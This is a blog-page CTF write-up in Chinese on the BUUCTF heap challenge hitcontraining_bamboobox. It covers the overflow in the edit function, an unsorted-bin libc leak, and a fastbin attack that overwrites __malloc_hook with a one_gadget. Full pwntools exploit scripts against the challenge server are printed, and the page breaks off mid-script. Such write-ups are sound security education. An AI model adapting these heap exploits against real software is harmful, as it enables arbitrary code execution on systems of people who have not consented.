<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BUU-hitcontraining_bamboobox | 墨水彩笔</title><meta name="author" content="墨水彩笔"><meta name="copyright" content="墨水彩笔"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="hitcontraining_bambooboxchecksec并查看运行流程 64位程序，并且没有开PIE&#x3D;&#x3D;可以修改got表  经典的菜单题目，且没有功能被删除 利用IDA分析 当时第一次看的时候，我还以为按了5之后会有什么，发现只是调用了一个结束的函数 并且经过分析之后发现漏洞点存在change函数中  这个change函数在修改原有堆块的时候不会检查重新定义的大小是否有问题，只看要被修改的">
<meta property="og:type" content="article">
<meta property="og:title" content="BUU-hitcontraining_bamboobox">
<meta property="og:url" content="http://example.com/2021/09/26/BUU-hitcontraining-bamboobox/index.html">
<meta property="og:site_name" content="墨水彩笔">
<meta property="og:description" content="hitcontraining_bambooboxchecksec并查看运行流程 64位程序，并且没有开PIE&#x3D;&#x3D;可以修改got表  经典的菜单题目，且没有功能被删除 利用IDA分析 当时第一次看的时候，我还以为按了5之后会有什么，发现只是调用了一个结束的函数 并且经过分析之后发现漏洞点存在change函数中  这个change函数在修改原有堆块的时候不会检查重新定义的大小是否有问题，只看要被修改的">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2021-09-26T06:32:05.000Z">
<meta property="article:modified_time" content="2021-10-17T08:19:58.053Z">
<meta property="article:author" content="墨水彩笔">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/09/26/BUU-hitcontraining-bamboobox/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  hexoversion: '5.2.0',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2021-10-17 16:19:58'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {
  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }

  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }
})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">54</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#hitcontraining-bamboobox"><span class="toc-number">1.</span> <span class="toc-text">hitcontraining_bamboobox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%B9%B6%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">checksec并查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">利用IDA分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.1.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9AFastbin-attack"><span class="toc-number">4.</span> <span class="toc-text">法一：Fastbin attack</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E6%88%91%E4%BB%AC%E4%BD%BF%E7%94%A8fastbin-attack%E6%97%B6%E9%9C%80%E8%A6%81%E8%A7%A3%E5%86%B3%E4%BB%A5%E4%B8%8B%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-number">4.0.1.</span> <span class="toc-text">首先我们使用fastbin attack时需要解决以下的问题：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E5%9B%9E%E7%AD%94%E9%97%AE%E9%A2%98%E4%B8%80%EF%BC%9A"><span class="toc-number">4.0.2.</span> <span class="toc-text">首先回答问题一：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%82%A3%E4%B9%88%E6%88%91%E4%BB%AC%E5%86%8D%E7%9C%8B%E7%9C%8B%E9%97%AE%E9%A2%98%E4%BA%8C%EF%BC%9A"><span class="toc-number">4.0.3.</span> <span class="toc-text">那么我们再看看问题二：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E6%88%91%E4%BB%AC%E6%9D%A5%E5%9B%9E%E7%AD%94%E4%B8%80%E4%B8%8B%E9%97%AE%E9%A2%98%E4%B8%89%EF%BC%9A"><span class="toc-number">4.0.4.</span> <span class="toc-text">最后我们来回答一下问题三：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%82%A3%E4%B9%88%E6%9C%80%E5%90%8E%E7%9A%84EXP"><span class="toc-number">4.1.</span> <span class="toc-text">那么最后的EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9AUnlink"><span class="toc-number">5.</span> <span class="toc-text">法二：Unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E7%A3%A8%E7%BB%86%E8%8A%82"><span class="toc-number">5.1.</span> <span class="toc-text">打磨细节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%89%EF%BC%9AHouse-of-Force"><span class="toc-number">5.2.</span> <span class="toc-text">法三：House of Force</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">5.3.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">BUU-hitcontraining_bamboobox</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-09-26T06:32:05.000Z" title="Created 2021-09-26 14:32:05">2021-09-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-10-17T08:19:58.053Z" title="Updated 2021-10-17 16:19:58">2021-10-17</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h2 id="hitcontraining-bamboobox"><a href="#hitcontraining-bamboobox" class="headerlink" title="hitcontraining_bamboobox"></a>hitcontraining_bamboobox</h2><h2 id="checksec并查看运行流程"><a href="#checksec并查看运行流程" class="headerlink" title="checksec并查看运行流程"></a>checksec并查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/BUU-hitcontraining-bamboobox/image-20210926143553422.png?raw=true" alt="image-20210926143553422.png"></p>
<p>64位程序，并且没有开PIE==可以修改got表</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/BUU-hitcontraining-bamboobox/image-20210926143718085.png?raw=true" alt="image-20210926143718085.png"></p>
<p>经典的菜单题目，且没有功能被删除</p>
<h2 id="利用IDA分析"><a href="#利用IDA分析" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/BUU-hitcontraining-bamboobox/image-20210926143836845.png?raw=true" alt="image-20210926143836845.png"></p>
<p>当时第一次看的时候，我还以为按了5之后会有什么，发现只是调用了一个结束的函数</p>
<p>并且经过分析之后发现漏洞点存在change函数中</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/BUU-hitcontraining-bamboobox/image-20210926144057836.png?raw=true" alt="image-20210926144057836.png"></p>
<p>这个change函数在修改原有堆块的时候不会检查重新定义的大小是否有问题，只看要被修改的堆块是否存在</p>
<p>因此这里就产生了堆溢出漏洞</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>漏洞点：存在堆溢出漏洞，且没有开启pie保护可以修改got表</p>
<h2 id="法一：Fastbin-attack"><a href="#法一：Fastbin-attack" class="headerlink" title="法一：Fastbin attack"></a>法一：Fastbin attack</h2><h4 id="首先我们使用fastbin-attack时需要解决以下的问题："><a href="#首先我们使用fastbin-attack时需要解决以下的问题：" class="headerlink" title="首先我们使用fastbin attack时需要解决以下的问题："></a>首先我们使用fastbin attack时需要解决以下的问题：</h4><p>1.如何泄露地址</p>
<p>2.如何利用fastbin attack去攻击</p>
<p>3.修改成功后为什么打不通</p>
<h4 id="首先回答问题一："><a href="#首先回答问题一：" class="headerlink" title="首先回答问题一："></a>首先回答问题一：</h4><p>本题中我们知道了存在堆溢出，那么我们是否可以通过伪造一个不属于fastbin的堆块来进行unsortedbin attack泄露地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(0x20,&#39;1111&#39;) #0</span><br><span class="line">add(0x20,&#39;2222&#39;) #1</span><br><span class="line">add(0x60,&#39;3333&#39;) #2</span><br><span class="line">add(0x10,&#39;4444&#39;) #3</span><br><span class="line"></span><br><span class="line">payload &#x3D; p64(0)*4 + p64(0) + p64(0xa1) </span><br><span class="line">edit(0,0x30,payload)</span><br></pre></td></tr></table></figure>

<p>这样我们现在的堆块1就是伪造的不属于fastbin的堆块了，此时将他delete就会进去unsortedbin，然后它的fd,bk指针就会出现地址</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/BUU-hitcontraining-bamboobox/image-20210926154454188.png?raw=true" alt="image-20210926154454188.png"></p>
<p>那么我们要怎么接收这个泄露的地址呢？</p>
<p>首先我们需要明确malloc的定义，首先在fastbin中找有没有被free的堆块，本题中我们只free了堆块一明显没有，那么接下来就回去unsortedbin中寻找</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里malloc寻找的顺序</span><br><span class="line">先找fastbin--&gt;smallbin--&gt;unsortedbin--&gt;small&#x2F;largebin--&gt;再次找--&gt;top chunk--&gt;vmmap</span><br></pre></td></tr></table></figure>

<p>其中Unsortedbin中寻找细节如下</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/BUU-hitcontraining-bamboobox/image-20210926155016121.png?raw=true" alt="image-20210926155016121.png"></p>
<p>并且此时我们知道我们虽然free的堆块一，但它现在被定义的大小是0xa1,也就是说堆块二也被看作是被free的了</p>
<p>那么如果我们此时add()一个0x20的大小==add(0x20)等同于创建了一个0x30的堆块，这时候unsortedbin是不是还没有分完，那么这时候我们存放的fd，bk指针是不是还在Unsortedbin中，并且因为切割了一块0x30的堆块，此时fd,bk的指针下移0x30的位置，那么如果此时你去看上一张图将fd,bk下移0x30会发现此时fd,bk的指针刚好在0x71的fd,bk上，这说明了什么？</p>
<p>我们此时是不是可以通过show()来泄露这些指针了呢？因为此时的堆块二（0x71）其实并没有被free，并且根据show()函数的判断此时它是可以被show的，那么我们执行show()就可以达到泄露的目的了。</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/BUU-hitcontraining-bamboobox/image-20210926155711393.png?raw=true" alt="image-20210926155711393.png"></p>
<p>经过证实也确实是可以完成的</p>
<h4 id="那么我们再看看问题二："><a href="#那么我们再看看问题二：" class="headerlink" title="那么我们再看看问题二："></a>那么我们再看看问题二：</h4><p>首先当我们获得了unsortedbin的fd,bk指针之后，就相当于我们知道了libc的偏移了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">leak_addr &#x3D; u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) - 0x3c4b78</span><br><span class="line">print hex(leak_addr)</span><br><span class="line">mlk_addr &#x3D; leak_addr + libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">print hex(mlk_addr)</span><br><span class="line">one_gadget &#x3D; leak_addr + 0x4526a</span><br><span class="line">realloc &#x3D; leak_addr + libc.symbols[&#39;realloc&#39;]</span><br></pre></td></tr></table></figure>

<p>这里的0x3c4b78就是一个固定的偏移，我们<strong>利用泄露的unsortedbin指针-vmmap中libc的基址</strong>得到</p>
<p>那么我们就可以通过fastbin的FILO的性质来达到任意写的目的</p>
<p>这时候我们的目标是将one_gadget写入malloc_hook中，这样的话只要我们执行malloc就会执行一次One_gadget</p>
<p>那么我们先上这一部分的exp再慢慢解释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(0x60,&#39;bbbb&#39;)</span><br><span class="line">delete(4)</span><br><span class="line">payload &#x3D; p64(mlk_addr - 0x23)</span><br><span class="line">edit(2,0x8,payload)</span><br><span class="line"></span><br><span class="line">add(0x60,&#39;cccc&#39;)</span><br></pre></td></tr></table></figure>

<p>首先我觉得大家都有点好奇为什么要先add(0x60)，是否还记得我们Unsoredbin中还有一部分没有分割的空间，这里就是让这部分空间完全被利用，使得我们被假定为free的chunk2解脱</p>
<p>那么问题接踵而至，为什么这里free的是chunk4不应该是chunk2嘛？</p>
<p>首先我们看看add()的内容到底加在了哪里</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/BUU-hitcontraining-bamboobox/image-20210926160644288.png?raw=true" alt="image-20210926160644288.png"></p>
<p>我们发现这里add()的内容加在的地方确实是我们chunk2(0x71)的位置</p>
<p>那么我们就需要好好分析一下现在的堆块情况了</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/BUU-hitcontraining-bamboobox/image-20210926161045833.png?raw=true" alt="image-20210926161045833.png"></p>
<p>我们要重新从IDA中分析到我们这里堆块的控制是用一块表控制的，并且这里的地址是固定的0x6020C0</p>
<p>可以看到我们此时拥有5个堆块的并且，我们刚刚创建的0x60大小的堆块的内容地址和我们chunk2的内容地址是重合的</p>
<p>那么是不是free(2)和free(4)的效果是一样的呢？</p>
<p>我们首先看看free(4)</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/BUU-hitcontraining-bamboobox/image-20210926161446502.png?raw=true" alt="image-20210926161446502.png"></p>
<p>我们同时看看chunk4的堆块情况和表单情况</p>
<p>在堆块中chunk2的新加入（add时写入的内容）内容被删除了，在表单中chunk4也是被抹除了</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/BUU-hitcontraining-bamboobox/image-20210926161640153.png?raw=true" alt="image-20210926161640153.png"></p>
<p>并且这里查看我们BIns的内容，可以看到我们的chunk2居然进去了，也就是说这时我们只要改写chunk2的fd内容就可以实现fastbin attack。也就是说delete(4)是可以的，并且可以完美的达到我们的目的</p>
<p>那么如果我们delete的是（2）呢？<br><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/BUU-hitcontraining-bamboobox/image-20210926161903088.png?raw=true" alt="image-20210926161903088.png"></p>
<p>欸，这么一看好像完全一样啊，那么这时候我们改写一下chunk4的内容看看效果</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/BUU-hitcontraining-bamboobox/image-20210926162005072.png?raw=true" alt="image-20210926162005072.png"></p>
<p>也是可以达到目的的，也就是说无论是delete(2)还是delete(4)其实都是没问题的只是到时候edit的堆块不一样，但结果还是一样的</p>
<h4 id="最后我们来回答一下问题三："><a href="#最后我们来回答一下问题三：" class="headerlink" title="最后我们来回答一下问题三："></a>最后我们来回答一下问题三：</h4><p>我们可以试试如果直接利用我们下面的exp能否打通</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;bamboobox&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;bamboobox&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,27105)</span><br><span class="line">libc &#x3D; ELF(&#39;libc-2.23-64.so&#39;)</span><br><span class="line">def add(size,content):</span><br><span class="line">	p.sendlineafter(&#39;Your choice:&#39;,&#39;2&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Please enter the length of item name:&#39;,str(size))</span><br><span class="line">	p.sendlineafter(&#39;Please enter the name of item:&#39;,str(content))</span><br><span class="line">def show():</span><br><span class="line">	p.sendlineafter(&#39;Your choice:&#39;,&#39;1&#39;)</span><br><span class="line">#p.sendlineafter(&#39;Please enter the index of item:&#39;,str(index))</span><br><span class="line">def edit(index,size,content):</span><br><span class="line">	p.sendlineafter(&#39;Your choice:&#39;,&#39;3&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Please enter the index of item:&#39;,str(index))</span><br><span class="line">	p.sendlineafter(&#39;Please enter the length of item name:&#39;,str(size))</span><br><span class="line">	p.sendlineafter(&#39;Please enter the new name of the item:&#39;,str(content))</span><br><span class="line">def delete(index):</span><br><span class="line">	p.sendlineafter(&#39;Your choice:&#39;,&#39;4&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Please enter the index of item:&#39;,str(index))</span><br><span class="line"></span><br><span class="line">add(0x20,&#39;1111&#39;) #0</span><br><span class="line">add(0x20,&#39;2222&#39;) #1</span><br><span class="line">add(0x60,&#39;3333&#39;) #2</span><br><span class="line">add(0x10,&#39;4444&#39;) #3</span><br><span class="line"></span><br><span class="line">payload &#x3D; p64(0)*4 + p64(0) + p64(0xa1) </span><br><span class="line">edit(0,0x30,payload)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">add(0x20,&#39;aaaa&#39;)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">leak_addr &#x3D; u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) - 0x3c4b78</span><br><span class="line">print hex(leak_addr)</span><br><span class="line">mlk_addr &#x3D; leak_addr + libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">print hex(mlk_addr)</span><br><span class="line">one_gadget &#x3D; leak_addr + 0x4526a</span><br><span class="line">realloc &#x3D; leak_addr + libc.symbols[&#39;realloc&#39;]</span><br><span class="line">add(0x60,&#39;bbbb&#39;)</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">payload &#x3D; p64(mlk_addr - 0x23)</span><br><span class="line">edit(4,0x8,payload)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(0x60,&#39;cccc&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x13 - 0x8)+ p64(0) + p64(one_gadget) --直接将mallo_hook修改为one_gadget</span><br><span class="line">add(0x60,payload)</span><br><span class="line">#add(0x18,&#39;dddd&#39;)</span><br><span class="line">p.sendlineafter(&#39;choice:&#39;,&#39;2&#39;)</span><br><span class="line">p.sendlineafter(&#39;name:&#39;,str(0x10))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>我们发现笑死根本打不通，于是我们就去借鉴别人的文章，去学习别人高端的操作</p>
<p>发现需要一个realloc函数帮忙</p>
<p>大家可以看看下面的链接的文章，我觉得写的很好（至少我讲起来乱乱的这个博主写的更系统和详细）</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Maxmalloc/article/details/102535427">https://blog.csdn.net/Maxmalloc/article/details/102535427</a></p>
<h3 id="那么最后的EXP"><a href="#那么最后的EXP" class="headerlink" title="那么最后的EXP"></a>那么最后的EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;bamboobox&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;bamboobox&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,27105)</span><br><span class="line">libc &#x3D; ELF(&#39;libc-2.23-64.so&#39;)</span><br><span class="line">def add(size,content):</span><br><span class="line">	p.sendlineafter(&#39;Your choice:&#39;,&#39;2&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Please enter the length of item name:&#39;,str(size))</span><br><span class="line">	p.sendlineafter(&#39;Please enter the name of item:&#39;,str(content))</span><br><span class="line">def show():</span><br><span class="line">	p.sendlineafter(&#39;Your choice:&#39;,&#39;1&#39;)</span><br><span class="line">#p.sendlineafter(&#39;Please enter the index of item:&#39;,str(index))</span><br><span class="line">def edit(index,size,content):</span><br><span class="line">	p.sendlineafter(&#39;Your choice:&#39;,&#39;3&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Please enter the index of item:&#39;,str(index))</span><br><span class="line">	p.sendlineafter(&#39;Please enter the length of item name:&#39;,str(size))</span><br><span class="line">	p.sendlineafter(&#39;Please enter the new name of the item:&#39;,str(content))</span><br><span class="line">def delete(index):</span><br><span class="line">	p.sendlineafter(&#39;Your choice:&#39;,&#39;4&#39;)</span><br><span class="line">	p.sendlineafter(&#39;Please enter the index of item:&#39;,str(index))</span><br><span class="line"></span><br><span class="line">add(0x20,&#39;1111&#39;) #0</span><br><span class="line">add(0x20,&#39;2222&#39;) #1</span><br><span class="line">add(0x60,&#39;3333&#39;) #2</span><br><span class="line">add(0x10,&#39;4444&#39;) #3</span><br><span class="line"></span><br><span class="line">payload &#x3D; p64(0)*4 + p64(0) + p64(0xa1) </span><br><span class="line">edit(0,0x30,payload)</span><br><span class="line">delete(1)</span><br><span class="line">add(0x20,&#39;aaaa&#39;)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">leak_addr &#x3D; u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) - 0x3c4b78</span><br><span class="line">print hex(leak_addr)</span><br><span class="line">mlk_addr &#x3D; leak_addr + libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">print hex(mlk_addr)</span><br><span class="line">one_gadget &#x3D; leak_addr + 0x4526a</span><br><span class="line">realloc 